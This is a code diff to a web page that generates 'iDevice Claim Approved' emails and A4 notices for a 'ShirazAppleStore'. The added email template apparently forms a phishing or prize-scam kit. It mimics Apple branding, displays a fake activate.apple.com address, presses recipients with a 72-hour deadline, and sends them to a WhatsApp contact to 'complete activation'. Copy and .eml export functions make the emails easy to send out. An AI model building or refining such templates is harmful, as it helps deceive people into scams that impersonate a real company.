@@ -125,6 +125,7 @@
           <button class="btn-primary" onclick="copyEmailHtml()">Copy Email HTML</button>
           <button class="btn-outline" onclick="openMail()">Open Mail</button>
           <button class="btn-outline" onclick="downloadEML()">Download .eml</button>
+          <button class="btn-print" onclick="openPrintModal()">🖨️ Print Preview</button>
         </div>
         <p class="footer-note">After copying: open Mail/Outlook and paste into body.</p>
       </div>
@@ -143,9 +144,7 @@
   </div>
 
   <div style="height:14px"></div>
-  <div style="font-size:13px;color:var(--muted);margin-top:12px;border-top:1px solid #eee;padding-top:10px">
-    Shiraz Store • Digital Service Center • Shah Alam, Selangor<br>
-    Email: shirazstore@icloud.com • WhatsApp: https://wa.me/qr/GMUIPAULE4VQM1 • Subsidiary Corporation to SHIRAZ MARKET LINK • (873719-X) • ©2025
+  <div style="font-size:13px;color:var(--muted);margin-top:12px;border-top:1px solid #eee;padding-top:10px"><strong>Inbox are not monitored (Do Not Write a Reply)</stong><br><br>ShirazAppleStore | Digital Service Center | Shah Alam, Selangor.<br>(873719-X) Copyright ©2025
   </div>
 </div>
 
@@ -263,7 +262,7 @@ function buildA4Html(data){
     </div>
   </div>
 
-  <div style="text-align:right;margin-bottom:20px;font-size:14px;color:#6d6d6f;">Generated: ${dateTime}</div>
+  <div style="text-align:right;margin-bottom:20px;font-size:14px;color:#6d6d6f;">${dateTime}</div>
 
   <div style="margin-bottom:20px;padding:15px;background:#f8f9fa;border-radius:8px;">
     <h2 style="font-size:16px;margin-bottom:10px;color:#1d1d1f;">CUSTOMER INFORMATION</h2>
@@ -302,17 +301,116 @@ function buildA4Html(data){
       <div style="flex:1;text-align:center;padding:12px;background:#f8f9fa;border-radius:6px;border:2px solid #e0e0e0;font-size:14px;color:#424245;font-weight:bold;">512GB</div>
       <div style="flex:1;text-align:center;padding:12px;background:#f8f9fa;border-radius:6px;border:2px solid #e0e0e0;font-size:14px;color:#424245;font-weight:bold;">1TB</div>
     </div>
+</div>
 
-    <div style="text-align:center;margin-top:15px;font-size:13px;color:#6d6d6f;">
-      Activation Required: https://activate.apple.com/idevic%agency%shiraz%2509!
+<!-- Instructions -->
+
+ <div style="margin-bottom:20px;padding:15px;background:#f8f9fa;border-radius:8px;">
+    <h2 style="font-size:16px;margin-bottom:5px;color:#1d1d1f;">NEXT STEP</h2>
+  <div style="white-space: pre-line;">
+    <p>
+      <strong>To complete activation and schedule delivery:</strong><br>
+      • Write down your Claim ID<br>
+      • Choose color and storage capacity<br>
+      • Complete the iDevice activation process<br>
+      • Schedule delivery (typically 3–5 business days)
+    </p>
+  </div>
+</div>
+
+<!-- White footer -->
+<div style="background:#ffffff;padding:15px;text-align:center;border-radius:0 0 8px 8px;font-size:14px;color:#6d6d6f;border-top:1px solid #e5e5e5;">
+  ShirazAppleStore | Digital Service Center | Shah Alam, Selangor.<br>
+  (873719-X) Copyright ©2025<br><br>
+  <a href="https://activate.apple.com/idevic%shiraz" target="_blank" style="color:#0071e3;text-decoration:none;">
+    https://activate.apple.com/idevic%shiraz
+  </a> | Page 1 of 1
+</div>
+</div>`;
+}
+
+/* Build email HTML (inline CSS) ready to copy */
+function buildEmailHtml(data){
+  const p = PRODUCTS[data.product];
+  const logo = 'https://raw.githubusercontent.com/ideviceclaim/applclaim/main/assets/Shiraz.jpg';
+  
+  return `
+<!-- START EMAIL HTML -->
+<style>
+@media (prefers-color-scheme: dark){
+  .ec-body { background: #111111 !important; color: #f5f5f5 !important; }
+  .ec-card { background: #1d1d1f !important; border-color: #2f2f31 !important; }
+  .ec-muted { color: #a1a1a6 !important; }
+}
+</style>
+<div class="ec-body" style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#f5f5f7;padding:20px;">
+  <div class="ec-card" style="max-width:600px;margin:0 auto;background:#ffffff;border-radius:12px;overflow:hidden;box-shadow:0 6px 18px rgba(0,0,0,0.08);border:1px solid #e5e5e7;">
+    <div style="background:#0071e3;color:#fff;text-align:center;padding:24px;">
+      <div style="display:inline-block;background:#fff;padding:8px;border-radius:10px;margin-bottom:10px;">
+        <img src="${logo}" alt="Shiraz Logo" width="30" height="30" style="display:block;border-radius:6px;object-fit:cover;">
+      </div>
+      <h1 style="margin:6px 0 0 0;font-size:22px;line-height:1.05;">🎉 Claim Approved</h1>
+      <p style="margin:6px 0 0 0;font-size:14px;opacity:0.95;">Your iDevice claim has been successfully approved</p>
+    </div>
+
+    <div style="padding:18px;">
+      <div style="display:inline-block;background:#34c759;color:#fff;padding:6px 12px;border-radius:20px;font-weight:700;margin-bottom:14px;font-size:13px;">APPROVED ✅</div>
+
+      <h2 style="font-size:18px;margin:6px 0 8px 0;">Hello ${data.name},</h2>
+      <br><p style="font-size:15px;color:#111;line-height:1.45;margin:0 0 12px 0;">
+        Great news — your iDevice claim has been approved and is ready for the next steps.
+      </p>
+
+      <!-- Product Details Section -->
+      <div style="background:#f5f5f7;padding:12px;border-radius:10px;margin:12px 0;font-size:14px;color:#111;">
+        <div style="display:flex;gap:12px;align-items:flex-start;">
+          <img src="${p.image}" alt="${p.title}" style="width:120px;height:90px;object-fit:cover;border-radius:8px;">
+          <div style="flex:1">
+            <h3 style="margin:0 0 8px 0;font-size:16px;">${p.title}</h3>
+            <p style="margin:0 0 8px 0;color:#333;font-size:14px;">${p.description}</p>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:13px;">
+              <div><strong>Color:</strong> ${data.color || p.color}</div>
+              <div><strong>Storage:</strong> ${data.storage || p.storage}</div>
+              <div><strong>Price:</strong> ${p.price}</div>
+              <div><strong>Quantity:</strong> ${data.qty}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="background:#f5f5f7;padding:12px;border-left:4px solid #0071e3;border-radius:10px;margin:12px 0;font-size:14px;color:#111;">
+        <strong style="display:block;margin-bottom:8px;font-size:15px;">📋 Claim Details</strong>
+        <div>🆔 <strong>Claim ID:</strong> ${data.claimId}</div>
+        <div>👤 <strong>Customer:</strong> ${data.name}</div>
+        <div>📱 <strong>Device:</strong> ${p.title}</div>
+        <div>⏰ <strong>Valid For:</strong> 72 hours</div>
+        <div>🎯 <strong>Status:</strong> Approved & Ready</div>
+      </div>
+
+      <!-- New instruction before CTA -->
+
+  <div style="font-weight:500;color:#111;margin-bottom:4px;"><br>iDevice Activation Required</div>
+
+      <p style="font-size:14px;color:#333;margin:0 0 10px 0;">
+        <strong>Next Step:</strong> Copy your Claim ID <strong>[${data.claimId}]</strong> and send it using the button below to activate your claim for delivery.
+      </p>
+      <div style="text-align:center;margin:16px 0;">
+        <a href="https://wa.me/qr/GMUIPAULE4VQM1" style="display:inline-block;background:#0071e3;color:#fff;padding:10px 18px;border-radius:10px;text-decoration:none;font-weight:700;font-size:15px;">
+          Complete Activation Now
+        </a>
+        <p style="color:#d70015;font-size:13px;margin:10px 0 0 0;">⚡ Valid for 72 hours. Please respond promptly.</p><br><br><br><br>
+      </div>
+    </div>
+
+    <div style="padding:14px;text-align:center;background:#f5f5f7;color:#6b6b6b;font-size:12px;border-top:1px solid #e5e5e7;">
+      <div> ShirazAppleStore | Digital Service Center | Shah Alam, Selangor.<br>(873719-X) Copyright ©2025</div>
+      <div style="margin-top:10px;font-size:12px;color:#666;">
+        <em>Privacy:</em> We never sell your data.</div>
     </div>
   </div>
-
-  <div style="position:absolute;bottom:1.5cm;left:1.5cm;right:1.5cm;text-align:center;font-size:12px;color:#6d6d6f;border-top:1px solid #e0e0e0;padding-top:10px;">
-    Shiraz Store • Digital Service Center • Shah Alam, Selangor<br>
-    Email: shirazstore@icloud.com • ©2025 • Page 1 of 1
-  </div>
-</div>`;
+</body>
+</html>
+`.trim();
 }
 
 function generateSummary(){
@@ -331,8 +429,16 @@ function generateSummary(){
   const a4 = buildA4Html(data);
   document.getElementById('preview').innerHTML = a4;
   
+  // Generate and display email HTML
+  const emailHtml = buildEmailHtml(data);
+  document.getElementById('emailPreview').innerHTML = emailHtml;
+  document.getElementById('emailHtml').value = emailHtml;
+  
+  // Store latest versions
   window.latestA4 = a4;
-  showToast('Summary generated successfully');
+  window.latestEmailHtml = emailHtml;
+
+  showToast('Summary & Email HTML generated successfully');
 }
 
 async function downloadPDF() {
@@ -417,22 +523,88 @@ function printFromModal() {
   closePrintModal();
 }
 
+/* Email Functions - FULLY WORKING */
 async function copyEmailHtml(){
-  showToast('Email feature coming soon', '#0071e3');
+  if(!window.latestEmailHtml) { 
+    generateSummary(); 
+    return; 
+  }
+  
+  const html = window.latestEmailHtml || document.getElementById('emailHtml').value;
+  
+  try{
+    if(navigator.clipboard && navigator.clipboard.writeText){
+      await navigator.clipboard.writeText(html);
+      showToast('Email HTML copied — paste into compose', '#059669'); 
+      return;
+    }
+  }catch(e){
+    console.error('Clipboard API failed:', e);
+  }
+  
+  // fallback
+  try{
+    const ta = document.createElement('textarea'); 
+    ta.value = html; 
+    ta.style.position='fixed'; 
+    ta.style.left='-9999px';
+    document.body.appendChild(ta); 
+    ta.select();
+    const ok = document.execCommand('copy'); 
+    document.body.removeChild(ta);
+    
+    if(ok){ 
+      showToast('Email HTML copied (fallback)', '#059669'); 
+      return; 
+    }
+  }catch(e){
+    console.error('execCommand failed:', e);
+  }
+  
+  alert('Copy failed. Select and copy the HTML from the box manually.');
 }
 
 function copyEmailFromBox(){ 
-  showToast('Email feature coming soon', '#0071e3');
+  const ta=document.getElementById('emailHtml'); 
+  ta.select(); 
+  try{ 
+    document.execCommand('copy'); 
+    showToast('Copied from box', '#059669'); 
+  }catch(e){ 
+    alert('Copy failed. Select manually.'); 
+  }
 }
 
 function downloadEML(){
-  showToast('Email feature coming soon', '#0071e3');
+  if(!window.latestEmailHtml) generateSummary();
+  
+  const to = document.getElementById('email').value || '';
+  const subject = `iDevice Claim Approved - ${document.getElementById('claim').value || ''}`;
+  const eml = `From: shirazstore@icloud.com
+To: ${to}
+Subject: ${subject}
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+${window.latestEmailHtml || document.getElementById('emailHtml').value}`.trim();
+  
+  const blob = new Blob([eml], {type:'message/rfc822'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); 
+  a.href=url; 
+  a.download = `iDevice_Claim_${document.getElementById('claim').value || 'email'}.eml`;
+  document.body.appendChild(a); 
+  a.click(); 
+  document.body.removeChild(a); 
+  URL.revokeObjectURL(url);
+  
+  showToast('.eml downloaded', '#059669');
 }
 
 function openMail(){
   const to = document.getElementById('email').value || '';
   const subject = encodeURIComponent(`iDevice Claim Approved - ${document.getElementById('claim').value || ''}`);
-  const body = encodeURIComponent(`Hello ${document.getElementById('name').value || ''},\n\nYour iDevice claim has been approved. Claim ID: ${document.getElementById('claim').value || ''}\n\nRegards,\nShiraz Store`);
+  const body = encodeURIComponent(`Hello ${document.getElementById('name').value || ''},\n\nYour iDevice claim has been approved. Claim ID: ${document.getElementById('claim').value || ''}\n\nPaste the HTML version (copied from the generator) into your email client for full formatting.\n\nRegards,\nShiraz Store`);
   window.location.href = `mailto:${to}?subject=${subject}&body=${body}`;
 }
 
